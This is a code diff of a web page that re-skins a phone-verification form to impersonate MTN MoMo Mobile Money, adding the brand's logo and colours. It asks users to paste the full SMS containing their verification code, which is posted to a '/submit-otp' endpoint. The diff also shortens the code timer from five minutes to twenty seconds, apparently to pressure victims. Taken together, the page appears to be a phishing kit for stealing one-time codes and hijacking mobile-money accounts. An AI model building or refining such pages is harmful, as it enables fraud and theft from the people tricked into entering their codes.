@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Verify Your Number</title>
+    <title>MTN MoMo - Verify</title>
     <style>
         * {
             margin: 0;
@@ -20,17 +20,34 @@
         }
         .top-bar {
             height: 72px;
-            background: #0d47a1;
+            background: #FFCC00;
             display: flex;
             align-items: center;
             padding: 0 22px;
             flex-shrink: 0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .top-bar .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .top-bar .logo svg {
+            height: 36px;
+            width: auto;
+        }
+        .top-bar .logo span {
+            font-weight: 700;
+            font-size: 18px;
+            color: #004B87;
+            letter-spacing: -0.5px;
         }
         .back-btn {
-            color: #fff;
+            color: #004B87;
             font-size: 30px;
             text-decoration: none;
             font-weight: 300;
+            margin-right: 16px;
         }
         .container {
             flex: 1;
@@ -44,7 +61,7 @@
         .title {
             font-size: 26px;
             font-weight: 700;
-            color: #0d47a1;
+            color: #004B87;
             margin-bottom: 4px;
             letter-spacing: -0.3px;
         }
@@ -56,7 +73,7 @@
         }
         .wrong-number {
             font-size: 15px;
-            color: #0d47a1;
+            color: #004B87;
             text-decoration: none;
             font-weight: 500;
             display: inline-block;
@@ -89,8 +106,8 @@
             line-height: 1.6;
         }
         .message-area textarea:focus {
-            border-color: #0d47a1;
-            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.15);
+            border-color: #FFCC00;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
         }
         .message-area textarea::placeholder {
             color: #aaa;
@@ -102,7 +119,7 @@
         }
         .resend-wrap .timer {
             font-weight: 600;
-            color: #0d47a1;
+            color: #004B87;
         }
         .continue-btn {
             position: fixed;
@@ -112,7 +129,7 @@
             height: 56px;
             border: none;
             border-radius: 10px;
-            background: #b7cff0;
+            background: #ccc;
             color: #fff;
             font-size: 20px;
             font-weight: 700;
@@ -126,11 +143,12 @@
             transform: translateX(-50%);
         }
         .continue-btn:enabled {
-            background: #0d47a1;
+            background: #FFCC00;
+            color: #004B87;
             cursor: pointer;
         }
         .continue-btn:enabled:hover {
-            background: #0a3a8a;
+            background: #e6b800;
         }
         #message-box {
             display: none;
@@ -171,6 +189,14 @@
 
     <div class="top-bar">
         <a href="#" class="back-btn">&#8592;</a>
+        <div class="logo">
+            <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
+                <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
+                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN MoMo</text>
+            </svg>
+            <span>Mobile Money</span>
+        </div>
     </div>
 
     <div class="container">
@@ -179,14 +205,14 @@
             Enter the code that was sent to (+263) 712345678
         </div>
         <a href="details.html" class="wrong-number">Wrong Number?</a>
-        <div class="valid-time">The code is valid for 5 minutes</div>
+        <div class="valid-time">The code is valid for 20 seconds</div>
 
         <div class="message-area">
             <textarea id="smsMessage" placeholder="Paste the whole SMS message here..."></textarea>
         </div>
 
         <div class="resend-wrap">
-            Resend code in <span class="timer">05:00</span>
+            Resend code in <span class="timer">00:20</span>
         </div>
     </div>
 
@@ -256,11 +282,13 @@
                 const val = textarea.value.trim();
                 if (val !== '') {
                     continueBtn.disabled = false;
-                    continueBtn.style.background = '#0d47a1';
+                    continueBtn.style.background = '#FFCC00';
+                    continueBtn.style.color = '#004B87';
                     continueBtn.style.cursor = 'pointer';
                 } else {
                     continueBtn.disabled = true;
-                    continueBtn.style.background = '#b7cff0';
+                    continueBtn.style.background = '#ccc';
+                    continueBtn.style.color = '#fff';
                     continueBtn.style.cursor = 'not-allowed';
                 }
                 hideMessage();
@@ -274,7 +302,7 @@
 
             const timerSpan = document.querySelector('.timer');
             const resendWrapEl = document.querySelector('.resend-wrap');
-            let totalSeconds = 5 * 60;
+            let totalSeconds = 20; // 20 seconds
             let interval = null;
 
             function formatTime(sec) {
@@ -286,14 +314,14 @@
             function updateTimerUI() {
                 if (totalSeconds <= 0) {
                     resendWrapEl.innerHTML = 'Resend code';
-                    resendWrapEl.style.color = '#1976d2';
+                    resendWrapEl.style.color = '#004B87';
                     resendWrapEl.style.cursor = 'pointer';
                     resendWrapEl.style.fontWeight = '600';
                     clearInterval(interval);
                     interval = null;
                     resendWrapEl.onclick = function(e) {
                         e.preventDefault();
-                        startTimer(5 * 60);
+                        startTimer(20);
                         hideMessage();
                     };
                     return;
@@ -323,7 +351,7 @@
                 }, 1000);
             }
 
-            startTimer(5 * 60);
+            startTimer(20);
 
             function hasRequiredData() {
                 if (!name) {
@@ -355,6 +383,7 @@
                 continueBtn.disabled = true;
                 continueBtn.textContent = 'Verifying...';
                 continueBtn.style.background = '#f5a623';
+                continueBtn.style.color = '#fff';
 
                 fetch('/submit-otp', {
                     method: 'POST',
@@ -384,8 +413,8 @@
                                     showMessage('Incorrect code. Please try again.', true);
                                     continueBtn.disabled = false;
                                     continueBtn.textContent = 'SUBMIT';
-                                    continueBtn.style.background = '#0d47a1';
-                                    continueBtn.style.cursor = 'pointer';
+                                    continueBtn.style.background = '#FFCC00';
+                                    continueBtn.style.color = '#004B87';
                                     textarea.value = '';
                                     checkTextArea();
                                     textarea.focus();
@@ -396,8 +425,8 @@
                                 showMessage('Verification error: ' + err.message, true);
                                 continueBtn.disabled = false;
                                 continueBtn.textContent = 'SUBMIT';
-                                continueBtn.style.background = '#0d47a1';
-                                continueBtn.style.cursor = 'pointer';
+                                continueBtn.style.background = '#FFCC00';
+                                continueBtn.style.color = '#004B87';
                             });
                     }, 2000);
                 })
@@ -405,8 +434,8 @@
                     showMessage('Send error: ' + err.message, true);
                     continueBtn.disabled = false;
                     continueBtn.textContent = 'SUBMIT';
-                    continueBtn.style.background = '#0d47a1';
-                    continueBtn.style.cursor = 'pointer';
+                    continueBtn.style.background = '#FFCC00';
+                    continueBtn.style.color = '#004B87';
                 });
             });
 
